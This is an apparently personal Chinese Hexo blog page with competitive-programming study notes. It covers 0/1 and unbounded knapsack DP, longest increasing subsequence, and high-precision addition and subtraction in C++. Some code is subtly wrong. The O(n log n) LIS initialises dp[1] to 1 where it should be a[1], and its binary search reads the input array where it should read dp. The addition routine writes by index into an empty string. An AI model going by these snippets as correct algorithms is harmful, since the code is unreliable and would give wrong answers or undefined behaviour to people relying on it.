<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> T,M; cin &gt;&gt; T &gt;&gt; M;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=M; ++i)cin &gt;&gt; t[i] &gt;&gt; v[i];</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=M; ++i)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j=T; j&gt;=t[i]; --j)</span><br><span class="line">dp[j]=<span class="built_in">max</span>( dp[j],dp[j-t[i]]+v[i] );</span><br></pre></td></tr></table></figure>
<p>注： 对于第1件物品a，找出a的占用空间t[i]、所有有可能装下a的背包，判断：装下a后，背包的价值=a的价值v[i]+剩余空间的价值；不装a，背包当前价值不变；对比两种情况取最优。（显而易见，对于第1件物品，所有背包都会选择装下它）这里做出的选择是当前情况最优的。 对于第2件物品b，找出b的占用空间t[i]、所有有可能装下b的背包。这些背包中，有些装过a（记为1），有些为空（记为2）（因为这些背包装不下a）。经过判断，1中一部分会选择装下b（如果这个背包有足够的空间同时装下a、b）（记为3），另一部分装不下（记为4），2中能装下b的记为5，装不下记为6。</p>
<p>至此得到3，4，5，6四个不同类型背包，每一个背包都装下了它所能装下的最大价值。以此类推，遍历完所有物品后，dp[T]即为所求。</p>
<p>问题：</p>
<p>为何循环<code>for (int j=T; j&gt;=t[i]; --j)</code>是由T到t[i]，而不能反过来？</p>
<h2 id="完全背包">完全背包</h2>
<p>与01背包基本相同，只有一个区别——背包可以选择多次装入同一个物品，即每种物品个数不唯一。求此时背包的最大价值。</p>
<p>部分代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> T,M; cin &gt;&gt; T &gt;&gt; M;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=M; ++i)cin &gt;&gt; t[i] &gt;&gt; v[i];</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=M; ++i)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j=t[i]; j&lt;=T; ++j)</span><br><span class="line">dp[j]=<span class="built_in">max</span>( dp[j],dp[j-t[i]]+v[i] );</span><br></pre></td></tr></table></figure>
<p>不难注意到，两段代码的差别只在第二重循环。 <code>for (int j=T; j&gt;=t[i]; --j)//01背包</code> <code>for (int j=t[i]; j&lt;=T; ++j)//完全背包</code></p>
<p>01背包在判断是否要装下某物品时，根据其循环的特性，装下物品后的剩余空间内不会有相同物品；</p>
<p>完全背包在判断时，根据其循环特性，装下物品后的剩余空间会存在相同的物品；</p>
<h1 id="线性动态规划">线性动态规划</h1>
<p>首先，动态规划和递推有些相似（尤其是线性动规），但是不同于递推的是： <strong>递推求出的是数据，所以只是针对数据进行操作；而动态规划求出的是最优状态，所以必然也是针对状态的操作，而状态自然可以出现在最优解中，也可以不出现——这便是决策的特性（布尔性）。</strong> 其次，由于每个状态均可以由之前的状态演变形成，所以动态规划有<strong>可推导性</strong>，但同时，动态规划也有<strong>无后效性</strong>，即<strong>每个当前状态会且仅会决策出下一状态，而不直接对未来的所有状态负责</strong>，可以浅显的理解为—— Future has nothing to do with past, and everything to do with present. <strong>未来于过去无关，现在决定未来</strong> 共勉</p>
<h2 id="lis求一个序列中的最长上升子序列">（LIS）求一个序列中的最长上升子序列</h2>
<p><strong>O(n<sup>2</sup>)做法</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		<span class="keyword">if</span> ( data[j] &lt; data[i])dp[i] = <span class="built_in">max</span>(dp[j] + <span class="number">1</span>, dp[i]);</span><br><span class="line"><span class="comment">//dp[i]存储：一个以data[i]结尾的序列的长度</span></span><br><span class="line"><span class="comment">//LIS=dp数组中的最大值</span></span><br></pre></td></tr></table></figure>
<p>例子手动模拟： <img src="/2020/11/25/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94%E4%BB%8E%E8%83%8C%E5%8C%85%E5%88%B0%E8%A2%AB%E6%9A%B4%E6%89%93/1.jpg" class></p>
<p>PS：求最长不下降子序列，只需在“if”中加一个“=”即可</p>
<p><strong>O(nlogn)做法</strong></p>
<p>dp[i]存储：在整个序列中的 上升长度为i的诺干个子序列中的 末尾值中的 最小值。（注意，这里dp的含义与n方做法不同）</p>
<p>这其实就是一种几近贪心的思想：我们当前的上升子序列长度如果已经确定，那么<strong>如果这种长度的子序列的结尾元素越小，后面的元素就可以更容易地加入到这条 我们臆测的 可作为结果的 上升子序列中。</strong></p>
<p>手动模拟图</p>
<img src="/2020/11/25/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94%E4%BB%8E%E8%83%8C%E5%8C%85%E5%88%B0%E8%A2%AB%E6%9A%B4%E6%89%93/3.jpg" class>
<p>手动模拟心里历程： 首先是初始设置： <img src="/2020/11/25/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94%E4%BB%8E%E8%83%8C%E5%8C%85%E5%88%B0%E8%A2%AB%E6%9A%B4%E6%89%93/4.jpg" class> 来到a2 发现a2可接上dp，于是加长dp，更新dp末端 来到a3 发现a3可接上dp，于是加长dp，更新dp末端 来到a4 发现a4不可接dp，不加长dp，寻找a4应该接在哪里，观察该处是否会出现和前后数字相等的情况，无则更新该处dp值 来到a5 。。。</p>
<p>为了便于理解，“寻找a4应该接在哪里”这一部分操作，先看作从左到右的枚举寻找，思考可否在这一步优化。</p>
<p>回顾一下dp数组存储的是什么，根据其性质可以看出dp数组一定是单调递增的，故采用二分寻找（Binary Search），完成优化。</p>
<p>代码如下 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n; cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)cin &gt;&gt; a[i], dp[i] = <span class="number">0xfffff</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">1</span>; dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (a[i] &gt; dp[len])dp[++len] = a[i];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> j = <span class="built_in">BS</span>(len, a[i]);</span><br><span class="line">		<span class="keyword">if</span> (a[i]&lt;dp[j] &amp;&amp; a[i]&gt;dp[j - <span class="number">1</span>])dp[j] = a[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; len &lt;&lt; endl;<span class="comment">//答案</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BS</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> cmp)</span><span class="comment">//二分法查找</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> l = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (l &lt; r)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (a[mid] &lt;= cmp)l = mid + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="lcs求两个序列中的最长公升子序列">（LCS）求两个序列中的最长公升子序列</h2>
<p>待更新</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/25/%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/11/25/%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97/" class="post-title-link" itemprop="url">高精度四则运算</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-11-25 21:42:45" itemprop="dateCreated datePublished" datetime="2020-11-25T21:42:45+08:00">2020-11-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-02-24 13:45:44" itemprop="dateModified" datetime="2022-02-24T13:45:44+08:00">2022-02-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="高精度的四则运算">高精度的四则运算</h1>
<p>cpp代码（函数） ### 加法</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">HPA</span><span class="params">(string s1,string s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[MAX]=&#123;<span class="number">0</span>&#125;,b[MAX]=&#123;<span class="number">0</span>&#125;,c[MAX]=&#123;<span class="number">0</span>&#125;;string s;<span class="comment">//MAX为计算数据范围</span></span><br><span class="line">	a[<span class="number">0</span>]=s1.<span class="built_in">length</span>(); b[<span class="number">0</span>]=s2.<span class="built_in">length</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=a[<span class="number">0</span>]; ++i)a[i]=s1[a[<span class="number">0</span>]-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=b[<span class="number">0</span>]; ++i)b[i]=s2[b[<span class="number">0</span>]-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (a[<span class="number">0</span>]&lt;b[<span class="number">0</span>])a[<span class="number">0</span>]=b[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=a[<span class="number">0</span>]; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		c[i]+=a[i]+b[i];</span><br><span class="line">		<span class="keyword">if</span> (c[i]&gt;=<span class="number">10</span>)&#123;c[i]%=<span class="number">10</span>; ++c[i+<span class="number">1</span>];&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (c[a[<span class="number">0</span>]+<span class="number">1</span>]==<span class="number">1</span>)++a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=a[<span class="number">0</span>]; i&gt;=<span class="number">1</span>; --i)s[a[<span class="number">0</span>]-i]=c[i]+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>赛场记忆： 转数字-'0'，转字符+'0' a[0]存最长长度 a[1]存个位 c存和 注意位数增加</p>
<h3 id="减法">减法</h3>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">HPS</span><span class="params">(string s1, string s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[MAX] = &#123; <span class="number">0</span> &#125;, b[MAX] = &#123; <span class="number">0</span> &#125;, c[MAX] = &#123; <span class="number">0</span> &#125;; string mi=<span class="string">&quot;0&quot;</span>,s;</span><br><span class="line">	a[<span class="number">0</span>] = s1.<span class="built_in">length</span>(); b[<span class="number">0</span>] = s2.<span class="built_in">length</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>]; ++i)a[i] = s1[a[<span class="number">0</span>] - i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= b[<span class="number">0</span>]; ++i)b[i] = s2[b[<span class="number">0</span>] - i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (b[<span class="number">0</span>] &gt; a[<span class="number">0</span>])<span class="built_in">swap</span>(a, b), mi = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (b[<span class="number">0</span>] == a[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (b[i] &gt; a[i]) &#123; <span class="built_in">swap</span>(a, b); mi = <span class="string">&quot;-&quot;</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (b[i] &lt; a[i])<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>]; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] &lt; b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			--a[i + <span class="number">1</span>];</span><br><span class="line">			a[i] += <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		c[i] = a[i] - b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	c[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (c[i] != <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">		--c[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!c[<span class="number">0</span>])<span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = c[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; --i)s+= (c[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mi == <span class="string">&quot;-&quot;</span>)s.<span class="built_in">insert</span>(<span class="number">0</span>, mi);</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>赛场记忆： 存储方法一致 注意位数减少，负号，输出0</p>
<h3 id="乘法">乘法</h3>
<p>（待更新）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">冲击波</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
